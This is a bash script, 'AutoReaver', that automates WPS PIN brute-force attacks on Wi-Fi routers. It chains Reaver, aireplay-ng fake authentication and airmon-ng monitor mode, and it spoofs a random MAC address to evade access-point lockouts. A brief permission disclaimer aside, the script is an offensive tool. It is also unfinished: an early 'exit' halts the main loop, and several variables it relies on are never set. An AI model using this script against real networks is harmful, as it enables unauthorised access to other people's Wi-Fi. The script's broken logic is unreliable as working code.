#!/bin/bash

###################################################################################################################################################
###### This is a bash script that automates  multiple AP attack using Reaver and a List of BSSIDs from a text file generated by Wash.
###### My version of AutoReaver is a litle bit less complex than DominikStyp, to check his  git clone https://code.google.com/p/auto-reaver/
###### Remember to ask permission or use it with your onwn AP, be responsible. tested successfully with older or unpatched routers using  WPS 1.0.
###### More recent devices will lock you down (AP rate limit), in this case the script loops to the next BSSID on the list.
###### Just execute the script, ./autoReaver, you will be prompt to select a WIFI device from a list of devices available,
###### WIFI devices info are retrieved from the path in Kali /sys/class/ieee80211
###### if at least one device is present, inside ieee80211 directory will apear phy0 or phy(#) directory(s), according to how many devices are plugged
###### this works in Kali, in other distros if paths are different you must change them in configurationSetting file.
###### A Wash list is generated by Autoreaver, you will be asked to select 1 AP or ALL.
###### You can ajust some Reaver settings during the script execution or manually change them in configurationSettings file.
###### In the end, after it loops all BSSID list, the script will exit after stoping Monitor Mode, reseting device driver and
###### restarting Netwok Manager service, systemctl restart NetworkManager .
###### Found PINS are stored in CRACKED directory
###################################################################################################################################################
###### REQUIREMENTS:
###### Reaver v1.6.6 (the version im using, dont know with older versions)
###### Macchanger
###### Airmon-ng, Aireplay-ng
###### Xterm
###### Wash
###################################################################################################################################################

source $(pwd)"/configurationSettings";

clear;

if [ "$EUID" -ne 0 ]; then
	echo "Please rua as root!!!";
	exit;
fi

if [[ ! -f $REAVER_DIR"/configurationSettings" ]]; then
	echo "OOOOOPS! You've lost configuration file of AutoReaver: ./configurationSettings";
	echo "Try to recover this file, or download default version from project site, and try again" && echo "";
	exit;
fi

if [[ ! -d "$REAVER_TMP_DIR" ]]; then
        mkdir -p -m 700 $REAVER_TMP_DIR;
fi

if [[ ! -d "$REAVER_SESSION_DIR" ]]; then
        mkdir -p -m 700 $REAVER_SESSION_DIR;
fi

if [[ ! -d "$REAVER_CRACKED_DIR" ]]; then
        mkdir -p -m 700 $REAVER_CRACKED_DIR;
fi

###########################################################################################################################
###################################################### FUNCTIONS ##########################################################
###########################################################################################################################

echoWhite(){
	echo "$(tput setaf 7)${1}$(tput sgr0)";
}

echoBlue(){
	echo "$(tput setaf 4)${1}$(tput sgr0)";
}

echoRed(){
        echo "$(tput setaf 1)${1}$(tput sgr0)";
}

setDeviceSettings(){
        if [ ! -d "$PATH_IEEE" ] || [ ! "$(ls -A $PATH_IEEE)" ]; then
                echoRed "---------------------------";
                echoRed "No WIFI Devices Detected!!!";
                echoRed "---------------------------";
                echo "" && exit;
	fi

	COUNT_DEV=1;
	declare -a ARR_DEVICES;

	echoBlue "#		Physical	Device		Driver";
	echoBlue "---------------------------------------------------------"

	for PHY in $(ls $PATH_IEEE); do
	        STR=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER);
	        DRIVER=$(ls $PATH_IEEE"$PHY"$PATH_DRIVER | cut -c5-${#STR});
	        LOGICAL=$(ls $PATH_IEEE"$PHY"$PATH_DEVICE);
	        echoBlue "[$COUNT_DEV]		$PHY		$LOGICAL		$DRIVER";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$PHY";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$LOGICAL";
                ARR_DEVICES[${#ARR_DEVICES[@]}]="$DRIVER";
	        COUNT_DEV=$((COUNT_DEV+1));
	done

	echo"";

	while true; do
	        read -p "Choose WIFI Device: " nChoice;

		if [[ $nChoice -le ${#ARR_DEVICES[@]}/3 && $nChoice -gt 0 ]]; then
			WIFI_CARD_DRIVER="${ARR_DEVICES[(nChoice*3)-1]}";
			WIFI_CARD_LOGICAL="${ARR_DEVICES[(nChoice*3)-2]}";
			IEEE_PHY="${ARR_DEVICES[(nChoice*3)-3]}";
			break;
		else
			echo "InValid Selection...";
		fi
	done
}

setAPSettings(){
	echo "Under Construction..."
}

setReaverOpt(){
	while true; do
        	read -p "Use $FAKE_AUTH_DELAY_SECONDS Sec AIREPLAY-NG Fake Authentication Delay (Y/N)? " yn;

		case $yn in
			[Yy]* )
				break;;
			[Nn]* )
				read -p "Please Enter New Fake Authentication Value: " nSec;

				if [[ $nSec -lt 6001 && $nSec -gt 0 ]]; then
		                        FAKE_AUTH_DELAY_SECONDS=$nSec;
					break;
	       	       		else
	        	                echoRed "Invalid Value...";
				fi;;
			* )
		esac
	done

        while true; do
                read -p "Use $REAVER_PIN_ATTEMPTS PIN Attempts Before Changin MAC (Y/N)? " yn;

                case $yn in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter PIN Attempts: " nAtt;

                                if [ $nAtt -gt 0 ]; then
                                        REAVER_PIN_ATTEMPTS=$nAtt;
                                        break;
                                else
                                        echoRed "Invalid Value...";
                                fi;;
                        * )
                esac
        done

        while true; do
                read -p "Use $REAVER_ATTEMPT_DELAY Sec Delay Between Reaver PIN Attempt (Y/N)? " yn;

                case $yn in
                        [Yy]* )
                                break;;
                        [Nn]* )
                                read -p "Please Enter New Attempt Delay Value: " nSec;

                                if [ $nSec -gt 0 ]; then
                                        REAVER_ATTEMPT_DELAY=$nSec;
                                        break;
                                else
                                        echoRed "Invalid Value...";
                                fi;;
                        * )
                esac
        done

	while true; do
		echoWhite "Use Addiciotal Reaver Options:";
		echoWhite "-E: Terminate each WPS session with an EAP FAIL packet";
		echoWhite "-S: Use small DH keys to improve crack speed";
		echoWhite "-N: Do not send NACK messages when out of order packets are received";
		echoWhite "-T 1: Set the M5/M7 timeout period";
		echoWhite "-t 15: Set the receive timeout period";
		echoWhite "--win7: Mimic a Windows 7 registrar";

                read -p "(Y/N)? " yn;

                case $yn in
                        [Yy]* )
				ADDITIONAL_OPTIONS_YN="Yes"
                                break;;
                        [Nn]* )
				ADDITIONAL_OPTIONS_YN="No";
				break;;
                        * )
                esac
        done
}

getRandomMac(){
	ifconfig $WIFI_CARD_LOGICAL down;
        echoBlue "Changing $WIFI_CARD_LOGICAL MAC......" && macchanger -r $1 $WIFI_CARD_LOGICAL;
}

resetDeviceDriver(){
	echoBlue "Reseting Device Driver ($WIFI_CARD_DRIVER)......" && modprobe -r $WIFI_CARD_DRIVER && modprobe $WIFI_CARD_DRIVER && sleep 1;
}

getMonitorName(){
	FIND_MONITOR=$(iwconfig | grep -Ei "$WIFI_CARD_LOGICAL.*monitor")
	WIFI_CARD_MONITOR=${FIND_MONITOR:${FIND_MONITOR%%$WIFI_CARD_LOGICAL*}:$((${#WIFI_CARD_LOGICAL}+3))}
}

startMonitor(){
	echoBlue "Killing Processes Associated to AIRMON-NG......";

	if [[ $(airmon-ng check | grep -ic "pid") != 0 ]]; then
		CMD_KILL="airmon-ng check kill";
		eval $CMD_KILL >>/dev/null;
		echoWhite "Processes Killed......";
	else
		echoWhite "No Processes to Kill......";
	fi

	sleep 2 && echoBlue "Starting Monitor Mode on $WIFI_CARD_LOGICAL......";
	CMD_START="airmon-ng start $WIFI_CARD_LOGICAL $AP_CHANNEL";
	eval $CMD_START >>/dev/null;
}

stopMonitor(){
	if [ -z "$WIFI_CARD_MONITOR" ]; then
		getMonitorName;
	fi

	CMD_STOP="airmon-ng stop $WIFI_CARD_MONITOR | cut -b ${str%%$WIF_CARD_LOGICAL*}-$((${#WIFICARD_LOGICAL}+3))"
	eval $CMD_STOP >>/dev/null;
}

###########################################################################################################################
###################################################### END FUNCTIONS ######################################################
###########################################################################################################################

clear;

while true; do
	PROCEED=0;

	echoWhite "Device Settings......";
	echo "";
	setDeviceSettings;
	echo "";
	clear;

	resetDeviceDriver;
	getRandomMac;
	startMonitor;
	sleep 2 && clear;
	exit;

	echoWhite "AutoReaver Settings......";
	echo "";
	setReaverOpt;
	clear;

	echoWhite "Device Settings ---------------------------------------------------------";
	echoBlue "Device Driver:							$WIFI_CARD_DRIVER";
	echoBlue "Device Monitor: 						$WIFI_CARD_LOGICAL";
	echoBlue "Device Physical:						$IEEE_PHY";
	echoWhite "Reaver/Aireplay-ng Settings ---------------------------------------------";
	echoBlue "Aireplay-ng Fake Authentication Delay:				$FAKE_AUTH_DELAY_SECONDS";
	echoBlue "Reaver PIN Attempts before MAC Changing:			$REAVER_PIN_ATTEMPTS";
	echoBlue "Reaver Delay Between PIN Attempts:				$REAVER_ATTEMPT_DELAY";
	echoBlue "Reaver Additional Options (-E -S -N -T 1 -t 15 --win7): 	$ADDITIONAL_OPTIONS_YN";
	echo "";

	while true; do
		read -p "Proceed (Y/N)?" yn;

		case $yn in
			[Yy]* )
				PROCEED=1;
				break;;
			[Nn]* )
				clear;
				break;;
			* )
				echoBlue "Please Answer Yes or No......";;
		esac
	done

	if [[ $PROCEED == 1 ]]; then
		break;
	fi
done

clear;

SESSION_FILE=$REAVER_SESSION_DIR'/'$AP_ESSID'_SESSION.wpc';

while true; do
	CMD_FAKE_AUTH="xterm -e 'aireplay-ng -1 $FAKE_AUTH_DELAY_SECONDS -a $AP_BSSID -c $AP_BSSID $MONITOR_NAME'";
	eval $CMD_FAKE_AUTH &
	sleep 4;

	CMD_REAVER="reaver -i $MONITOR_NAME -b $AP_BSSID --channel=$AP_CHANNEL --mac=$RND_MAC --session=$SESSION_FILE -g $REAVER_PIN_ATTEMPTS -d $REAVER_ATTEMPT_DELAY -vv $ADDITIONAL_OPTIONS > $REAVER_TMP_DIR'/REAVER_OUTPUT';"
	eval $CMD_REAVER

	REAVER_GET_KEY=$(grep -c 'WPS PIN' $REAVER_TMP_DIR'/REAVER_OUTPUT');

	if [[ $REAVER_GET_KEY == 1 ]]; then
		echoWhite "PIN Cracked......";
		sleep 6 && clear;
		break;
	else
		echoWhite "Failed to recover WPA key......";
		sleep 4 && clear;
	fi

        resetDeviceDriver;
	getRandomMac;
        startMonitor;
done
